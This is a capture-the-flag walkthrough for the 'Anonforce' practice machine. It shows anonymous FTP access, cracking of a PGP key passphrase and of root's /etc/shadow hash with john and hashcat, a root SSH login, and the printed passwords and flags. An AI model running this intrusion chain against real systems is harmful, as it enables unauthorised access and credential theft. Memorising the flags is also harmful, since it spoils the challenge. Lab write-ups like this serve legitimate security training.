# Anonforce Writeup

> Machine : Linux

> boot2root machine for FIT and bsides guatemala CTF

## Solution

```shell
nmap -sV -sC -Pn --open 10.130.191.52 -p-
```

From our results, we can see ports 21 (FTP) and 22 (SSH) are open. And `anonymous` login is allowed.

```shell
ftp 10.130.191.52
anonymous
```

```shell
ls
```

```text
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Sep 09 02:43 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 Sep 09 02:43 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Sep 09 02:43 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Sep 09 02:43 sys
drwxrwxrwt    9 0        0            4096 Sep 09 02:43 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
```

We can see there is a directory named `notread`, so let's read it.

```shell
cd notread
```

```shell
mget *
```

```shell
file *
```

```text
backup.pgp:  data
private.asc: PGP private key block
```

One is the `pgp encrypted` file, and the other is the `private key`, but to use that private key we still have to enter a passphrase which we don’t know.

The only possible way is to brute force the passphrase. I will use `john` to brute force the `private.asc` file for the passphrase so let’s convert the file to hash with `gpg2john` then brute force the hash.

```shell
gpg2john private.asc > private.asc.hash
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt private.asc.hash 
```

```text
xbox360          (anonforce)     
```

Now we can import the key, and then decrypt the file.

```shell
gpg --import private.asc
```

```shell
gpg --decrypt backup.pgp 
```

```text
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::      
```

And we have this, which is a `/etc/shadow` file. And we have the hash for the root password so let's try crack it using `hashcat`.

```shell
echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root_pass.txt
```

```shell
hashcat root_pass.txt /usr/share/wordlists/rockyou.txt
```

```text
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari
```

Now we have the password `hikari` so let's try enter to root using `ssh`.

```shell
ssh root@10.130.191.52
hikari
```

```shell
whoami
```

```text
root
```

```shell
cat /home/melodias/user.txt
```

```text
606083fd33beb1284fc51f411a706af8
```

> user.txt
> 
> 606083fd33beb1284fc51f411a706af8

```shell
cat root.txt
```

```text
f706456440c7af4187810c31c6cebdce
```

> root.txt
> 
> f706456440c7af4187810c31c6cebdce

